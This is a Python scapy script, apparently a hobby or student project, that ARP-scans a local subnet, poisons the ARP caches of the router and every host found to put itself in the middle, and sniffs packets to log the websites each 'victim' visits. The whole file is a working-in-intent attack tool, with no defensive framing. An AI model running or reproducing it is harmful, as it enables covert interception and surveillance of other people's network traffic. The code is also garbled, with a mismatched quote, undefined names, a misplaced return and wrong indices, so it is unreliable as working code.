# IP forwarding must be enabled.

from scapy.all import *
import time

class Victim():
	def __init__(self, IPaddress):
		self.IP = IPaddress
		self.MAC = ""
		self.websites = []
		
	def get_IP(self):
		return self.IP
		
	def visit_website(self, domain):
		n = len(self.websites)
		for i in range(0, n):
			website = self.websites[i]
			if website.get_domain() == domain:
				website.visit()
				return	
		self.websites.append(Website(domain))

class Website():
	def __init__(self, domain):
		self.domain = domain
		self.visits = 1
		
	def get_domain(self):
		return domain
		
	def visit():
		visits += 1


class PrePreAttack(object):	
	def get_IP_Addrs(self, routerIP):
		num_Array = routerIP.split('.')
		arp_List = ".".join(num_Array[0:3])+".*" #this is to get the string in form "X.X.X.*"
		ans, unans = arping(arp_List)
		n = len(ans)
		victims = []
		for i in range(0, n):
			victims.append(Victim(ans[i][1].psrc))
		return victims

class PreAttack(object):
	def __init__(self, target, interface):
		self.target = target
		self.interface = interface
	def get_MAC_Addr(self):
		return srp(Ether(dst="ff:ff:ff:ff:ff:ff')/ARP(pdst=self.target),timeout=10, iface=self.interface)[0][0][1][ARP].hwsrc

class Attack(object):
	def __init__(self, router, targets, interface):
		self.router = router
		self.targets = targets 
		self.interface = interface
	def send_Poison(self, my_Mac):
		for i in range(0, len(targets)):
			#arp to spoof the victim, send to router
			arp1 = Ether() / ARP()
			arp1[Ether].src = my_Mac #attacking MAC address
			arp1[ARP].hwsrc = my_Mac #attacking MAC address
			arp1[ARP].psrc = self.targets[i].IP #IP to Spoof
			arp1[ARP].hwdst = self.targets[0].MAC
			arp1[ARP].pdst = self.router
			sendp(arp1, iface = self.interface)
			#arp to spoof the router, send to victim
			arp2 = Ether() / ARP()
			arp2[Ether].src = my_Mac #attacking MAC address
			arp2[ARP].hwsrc = my_Mac #attacking MAC address
			arp2[ARP].psrc = self.router #IP to Spoof
			arp2[ARP].hwdst = self.targets[i].MAC
			arp2[ARP].pdst = self.targets[i].IP
			sendp(arp2, iface = self.interface)
			
class track_traffic():
	def __init__(self, targets):
		self.targets=targets
	def track_packet(self, packet):
		import socket
		
		source = packet.src
		dest   = packet.dst
		
		for i in range (0, len(targets)):
			if self.targets[i].get_IP == src:
				self.targets[i].visit(socket.gethostbyaddr(dest))
				return
			if self.targets[i].get_IP == dest:
				self.targets[i].visit(socket.gethostbyaddr(src))
				return
	
	return track_packet
    


if __name__ == '__main__':
	import time
	from scapy.all import *
	try:
		interface = "enp0s8" #interface
		my_Mac_Addr = get_if_hwaddr(interface)
		IP_router = sr1(IP(dst = "www.wikipedia.org", ttl = 0)/ICMP()) #ttl = 0 to find the router with whom we connected
	#	print(IP_router.src)
		targets = PrePreAttack().get_IP_Addrs(IP_router.src)
	#	print(targets[0])
		try:
			for i in range(0, len(targets)):
				targets[i].MAC=PreAttack(targets[i].IP, interface).get_MAC_Addr()
		except Exception:
			print("[Cannot find MAC addresses]")

		while True:
			try:
				Attacks(IP_router.src, targets, interface).send_Poison(my_Mac_Addr)
				#sleep(3)
				sniff(filter="ip", prn=track_traffic(targets).track_packet, count=10)
			except Exception:
				print("[Failed to send ARP-Poison]")
	except KeyboardInterrupt:
		print("[KeyBoard Interrupt]")
		print("[Shutting down]")
